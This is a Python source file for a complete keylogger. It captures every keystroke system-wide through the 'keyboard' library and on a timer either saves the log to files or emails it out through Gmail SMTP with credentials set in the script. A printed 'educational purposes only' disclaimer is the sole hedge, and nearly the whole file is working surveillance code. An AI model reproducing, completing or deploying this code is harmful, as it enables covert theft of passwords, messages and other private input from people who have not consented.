import keyboard
import smtplib
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Parameters
SEND_REPORT_EVERY = 60  # in seconds, reporting interval
EMAIL_ADDRESS = "your_email@gmail.com"  # CHANGE THIS
EMAIL_PASSWORD = "your_app_password"    # CHANGE THIS

class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.filename = ""
    
    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name
    
    def update_filename(self):
        # Format datetime strings properly
        start_dt_str = self.start_dt.strftime("%Y-%m-%d_%H-%M-%S")
        end_dt_str = self.end_dt.strftime("%Y-%m-%d_%H-%M-%S")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
    
    def report_to_file(self):
        try:
            self.update_filename()
            with open(f"{self.filename}.txt", "w") as f:
                f.write(self.log)
            print(f"[+] Saved {self.filename}.txt")
        except Exception as e:
            print(f"[-] Error saving to file: {e}")
    
    def prepare_mail(self, message):
        try:
            msg = MIMEMultipart()
            msg["From"] = EMAIL_ADDRESS
            msg["To"] = EMAIL_ADDRESS
            msg["Subject"] = "Keylogger logs"
            
            # Create HTML content
            html = f"""
            <html>
                <body>
                    <h2>Keylogger Report</h2>
                    <p><strong>Time:</strong> {datetime.now()}</p>
                    <p><strong>Log:</strong></p>
                    <pre>{message}</pre>
                </body>
            </html>
            """
            
            text_part = MIMEText(message, "plain")
            html_part = MIMEText(html, "html")
            
            msg.attach(text_part)
            msg.attach(html_part)
            
            return msg
        except Exception as e:
            print(f"[-] Error preparing mail: {e}")
            return None
    
    def sendmail(self, email, password, message, verbose=1):
        try:
            # Using Gmail SMTP (you can change to your email provider)
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(email, password)
            
            # Prepare and send the email
            email_message = self.prepare_mail(message)
            if email_message:
                server.sendmail(email, email, email_message.as_string())
            
            server.quit()
            
            if verbose:
                print(f"{datetime.now()} - Sent email to {email}")
            return True
        except Exception as e:
            print(f"[-] Error sending email: {e}")
            return False
    
    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            
            if self.report_method == "email":
                if EMAIL_ADDRESS != "your_email@gmail.com":  # Check if email is configured
                    success = self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
                    if success:
                        print(f"[+] Email sent with log of {len(self.log)} characters")
                    else:
                        print("[-] Failed to send email, saving to file instead")
                        self.report_method = "file"
                        self.report_to_file()
                else:
                    print("[-] Email not configured, saving to file")
                    self.report_method = "file"
                    self.report_to_file()
            elif self.report_method == "file":
                self.report_to_file()
            
            # Reset log after reporting
            self.log = ""
        
        # Schedule next report
        self.start_dt = datetime.now()
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()
    
    def start(self):
        print(f"[+] Starting keylogger at {datetime.now()}")
        print("[+] Press ESC to stop")
        
        # Start keyboard listener
        keyboard.on_release(callback=self.callback)
        
        # Start reporting
        self.report()
        
        # Wait for ESC key to stop
        keyboard.wait('esc')
        print("[+] Keylogger stopped")

if __name__ == "__main__":
    print("=" * 50)
    print("KEYLOGGER APPLICATION")
    print("=" * 50)
    print("\nIMPORTANT: This tool is for educational purposes only!")
    print("Use only on your own systems or with explicit permission.\n")
    
    # Let user choose reporting method
    print("Choose reporting method:")
    print("1. Email (requires Gmail with App Password)")
    print("2. Save to file")
    
    choice = input("Enter choice (1 or 2): ").strip()
    
    if choice == "1":
        # Email configuration check
        if EMAIL_ADDRESS == "your_email@gmail.com":
            print("\n[-] Email not configured!")
            print("[!] Please edit the script and set your email credentials")
            print("[!] Changing to file mode instead")
            report_method = "file"
        else:
            report_method = "email"
    else:
        report_method = "file"
    
    # Get reporting interval
    try:
        interval = int(input(f"Enter reporting interval in seconds (default {SEND_REPORT_EVERY}): ") or SEND_REPORT_EVERY)
    except ValueError:
        interval = SEND_REPORT_EVERY
        print(f"[!] Invalid input, using default: {interval} seconds")
    
    print(f"\n[+] Starting with {report_method} reporting every {interval} seconds")
    print("[+] Keylogger is running...")
    
    # Start keylogger
    keylogger = Keylogger(interval=interval, report_method=report_method)
    
    try:
        keylogger.start()
    except KeyboardInterrupt:
        print("\n[+] Keylogger stopped by user")
    except Exception as e:
        print(f"[-] Error: {e}")